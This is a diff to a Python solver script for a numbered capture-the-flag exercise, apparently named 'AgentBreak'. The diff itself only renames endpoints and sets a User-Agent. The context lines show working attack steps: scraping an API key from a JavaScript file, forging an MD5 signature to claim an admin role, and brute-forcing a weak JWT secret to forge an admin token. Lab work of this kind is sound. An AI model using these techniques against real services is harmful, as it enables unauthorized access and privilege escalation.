@@ -36,7 +36,7 @@ JWT_SECRET = None    # кэш секрета api v2 (уровни 7, 10)
 
 
 def req(path, data=None, headers=None, form=None):
-    hdrs = {}
+    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AgentBreak/2.2"}
     if COOKIE:
         hdrs["Cookie"] = "; ".join("%s=%s" % kv for kv in COOKIE.items())
     if headers:
@@ -134,7 +134,7 @@ def x5_signed_role():
     _, js = req("/static/portal.js")
     key = re.search(r'API_KEY\s*=\s*"([^"]+)"', js).group(1)
     sign = md5("%s:admin" % salt)
-    _, body = req("/api/notify?key=%s&role=admin&sign=%s" % (key, sign))
+    _, body = req("/svc/notify?key=%s&role=admin&sign=%s" % (key, sign))
     m = re.search(r"FLAG-5-[0-9a-f]+", body)
     assert m, "подпись не прошла: %s" % body[:200]
     return m.group(0)
@@ -184,7 +184,7 @@ def _brute_jwt(h, p, sig):
 def x7_jwt_forge():
     """Уровень 7: брутфорс 4-символьного секрета, подделка svc-internal + iat."""
     global JWT_SECRET
-    _, body = req("/api2/token")
+    _, body = req("/svc2/token")
     token = json.loads(body)["token"]
     h, p, sig = token.split(".")
     secret = JWT_SECRET or _brute_jwt(h, p, sig)
@@ -197,7 +197,7 @@ def x7_jwt_forge():
     fh, fp = b64u({"alg": "HS256", "typ": "JWT"}), \
         b64u({"user": "svc-internal", "role": "admin", "iat": int(time.time())})
     fs = hmac.new(secret.encode(), ("%s.%s" % (fh, fp)).encode(), hashlib.sha256).hexdigest()
-    _, vault = req("/api2/vault?token=%s.%s.%s" % (fh, fp, fs))
+    _, vault = req("/svc2/vault?token=%s.%s.%s" % (fh, fp, fs))
     m = re.search(r"FLAG-7-[0-9a-f]+", vault)
     assert m, "подделка не прошла: %s" % vault[:200]
     return m.group(0)
